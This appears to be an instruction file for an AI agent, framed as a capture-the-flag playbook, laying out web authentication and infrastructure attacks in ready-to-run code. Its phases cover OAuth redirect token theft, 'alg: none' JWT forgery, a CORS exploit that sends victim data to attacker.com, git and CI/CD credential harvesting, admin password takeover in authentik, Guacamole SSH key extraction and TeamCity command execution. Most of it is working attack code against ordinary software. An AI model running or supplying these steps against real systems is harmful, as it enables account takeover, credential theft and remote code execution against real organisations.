---
name: web-auth-infra
description: "CTF web infrastructure authentication attacks. OAuth open redirect token theft, OIDC alg-none manipulation, OAuth state CSRF, CORS reflected origin exploitation, git history credential leakage, CI/CD variable credential theft, identity provider API takeover (authentik/Keycloak), SAML SSO flow automation, Apache Guacamole connection parameter extraction, login page poisoning for credential harvesting, TeamCity REST API RCE. Triggers: 'oauth attack', 'oidc token manipulation', 'cors misconfiguration', 'git history credentials', 'cicd variable theft', 'authentik takeover', 'saml automation', 'guacamole credentials', 'teamcity rce', 'login page poisoning', 'oauth redirect theft', 'identity provider api'."
---

# CTF Web: OAuth, SAML & Infrastructure Auth Attacks

OAuth/OIDC exploitation, CORS, git history leaks, CI/CD, SAML, Guacamole, TeamCity.

---

## Phase 1: OAuth/OIDC Exploitation

### Open Redirect Token Theft

```python
import requests

# Craft malicious authorization URL with redirect_uri bypass:
auth_url = "https://target.com/oauth/authorize"
params = {
    "client_id": "legitimate_client",
    "redirect_uri": "https://target.com/callback/../@attacker.com",
    "response_type": "code",
    "scope": "openid profile"
}
# Other redirect_uri bypass patterns:
# https://target.com/callback?next=https://evil.com
# https://target.com/callback%23@evil.com  (fragment)
# https://target.com/callback/.evil.com
# https://target.com.evil.com  (subdomain)
# https://target.com/callback/../@evil.com  (path traversal)
```

### OIDC ID Token Manipulation (alg: none)

```python
import jwt, json, base64

token = "eyJ..."  # captured ID token
header, payload, sig = token.split(".")
payload_data = json.loads(base64.urlsafe_b64decode(payload + "=="))
payload_data["sub"] = "admin"
payload_data["email"] = "admin@target.com"

new_header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b"=")
new_payload = base64.urlsafe_b64encode(
    json.dumps(payload_data).encode()
).rstrip(b"=")
forged = f"{new_header.decode()}.{new_payload.decode()}."
```

### OAuth State Parameter CSRF

```python
# Missing/predictable state → CSRF
# Attacker initiates OAuth flow → captures callback URL → sends to victim
# Victim's session linked to attacker's OAuth account

# Detection: verify state parameter is:
# 1. Present in authorization request
# 2. Validated on callback (compare to session-stored value)
# 3. Bound to user session (not just random value)
```

---

## Phase 2: CORS Misconfiguration

```python
import requests

# Test for reflected Origin:
bypass_origins = [
    "https://evil.com",
    "https://target.com.evil.com",
    "null",
    "https://target.com%60.evil.com",
]

for origin in bypass_origins:
    r = requests.get("https://target.com/api/sensitive",
                     headers={"Origin": origin})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    if origin in acao or acao == "*":
        print(f"[!] Reflected: {origin} -> ACAO: {acao}, ACAC: {acac}")
```

```javascript
// Exploit: steal data via CORS when ACAO reflects Origin AND ACAC: true
fetch('https://target.com/api/user/profile', {
    credentials: 'include'
}).then(r => r.json()).then(data => {
    fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
});
```

---

## Phase 3: Git History Credential Leakage

```bash
git log --all --oneline   # find all commits
git show <first_commit>   # initial commits often have credentials

# Search all history for deleted secrets:
git log -p --all -S "password"
git log -p --all -S "api_key"
git log -p --all -S "token"
git log -p --all -S "secret"

# Show removed files across all branches:
git log --all --diff-filter=D --summary | grep delete
git show <commit>:<deleted_file>
```

---

## Phase 4: CI/CD Variable Theft

```bash
# GitLab: Settings → CI/CD → Variables (visible to project admins)
# GitHub: Settings → Secrets and variables → Actions
# Jenkins: Manage Jenkins → Credentials

# In exposed .env or leaked build logs:
grep -r "GITLAB_TOKEN\|CI_JOB_TOKEN\|GITHUB_TOKEN" .

# Use stolen token to access identity providers, Vault, AWS:
export AUTHENTIK_TOKEN="stolen_token"
curl -H "Authorization: Bearer $AUTHENTIK_TOKEN" \
  https://auth.target.com/api/v3/core/users/
```

---

## Phase 5: Identity Provider API Takeover (authentik/Keycloak)

```python
import requests

BASE = "https://auth.target.com"
TOKEN = "stolen_admin_token"
headers = {"Authorization": f"Bearer {TOKEN}"}

# 1. Enumerate users:
r = requests.get(f"{BASE}/api/v3/core/users/", headers=headers)
users = r.json()['results']

# 2. Find target user (admin):
target_pk = next(u['pk'] for u in users if u['username'] == 'admin')

# 3. Set password:
requests.post(
    f"{BASE}/api/v3/core/users/{target_pk}/set_password/",
    headers=headers,
    json={"password": "attacker_password"}
)

# 4. Authenticate (MFA skipped if not_configured_action: skip and no devices):
# GET /api/v3/flows/executor/default-authentication-flow/ to start stage
# POST answers to each stage, follow 302s to get session
```

---

## Phase 6: SAML SSO Flow Automation

```python
import requests
from urllib.parse import urlparse, parse_qs

session = requests.Session()

# Step 1: Start login at SP → get SAMLRequest + RelayState
r = session.get("https://app.target.com/saml/login")
redirect_url = r.headers['Location']
params = parse_qs(urlparse(redirect_url).query)
saml_request = params['SAMLRequest'][0]
relay_state = params['RelayState'][0]

# Step 2: Authenticate with IdP (you control credentials):
r = session.post("https://auth.target.com/api/v3/flows/executor/.../",
                 json={"component": "ak-stage-password",
                       "uid_field": "admin",
                       "password": "attacker_password"})

# Step 3: Submit SAMLResponse + RelayState to SP callback:
saml_response = extract_saml_response(r)
r = session.post("https://app.target.com/saml/acs",
                 data={"SAMLResponse": saml_response,
                       "RelayState": relay_state})
# auth_token in redirect state parameter
```

---

## Phase 7: Apache Guacamole Credential Extraction

```bash
# Via API with auth token:
TOKEN="guacamole_auth_token"
curl "http://TARGET:8080/guacamole/api/session/data/mysql/connections/1/parameters?token=$TOKEN"
# Returns: hostname, port, username, private-key, passphrase

# Via MySQL directly:
mysql -u guacamole_user -p guacamole_db -e "
SELECT c.connection_name, cp.parameter_name, cp.parameter_value
FROM guacamole_connection c
JOIN guacamole_connection_parameter cp ON c.connection_id = cp.connection_id;"
# Exposes plaintext SSH private keys for all managed hosts
```

---

## Phase 8: TeamCity REST API RCE

```bash
HOST="http://teamcity:8111"
CREDS="admin:password"

# 1. Create project:
curl -X POST "$HOST/httpAuth/app/rest/projects" -u "$CREDS" \
  -H 'Content-Type: application/xml' \
  -d '<newProjectDescription name="pwn" id="pwn"><parentProject locator="id:_Root"/></newProjectDescription>'

# 2. Create build config:
curl -X POST "$HOST/httpAuth/app/rest/projects/pwn/buildTypes" -u "$CREDS" \
  -H 'Content-Type: application/xml' \
  -d '<newBuildTypeDescription name="rce" id="rce"><project id="pwn"/></newBuildTypeDescription>'

# 3. Add command step:
curl -X POST "$HOST/httpAuth/app/rest/buildTypes/id:rce/steps" -u "$CREDS" \
  -H 'Content-Type: application/xml' \
  -d '<step name="cmd" type="simpleRunner"><properties>
    <property name="script.content" value="cat /root/root.txt"/>
    <property name="use.custom.script" value="true"/>
  </properties></step>'

# 4. Trigger + read log:
curl -X POST "$HOST/httpAuth/app/rest/buildQueue" -u "$CREDS" \
  -H 'Content-Type: application/xml' \
  -d '<build><buildType id="rce"/></build>'
# Note buildId from response
curl "$HOST/httpAuth/downloadBuildLog.html?buildId=BUILD_ID" -u "$CREDS"
```

---

## Output

Save to `.omop/engagement/ctf/web/`:
- `oauth_exploit.py`: OAuth attack script
- `credentials.txt`: extracted credentials
- `flag.txt`: found flag

## Next Phase

→ `ctf-web-auth-access` for auth bypass and access control
→ `vuln-oauth` for OAuth misconfiguration testing
→ `tech-cicd` for CI/CD attack techniques
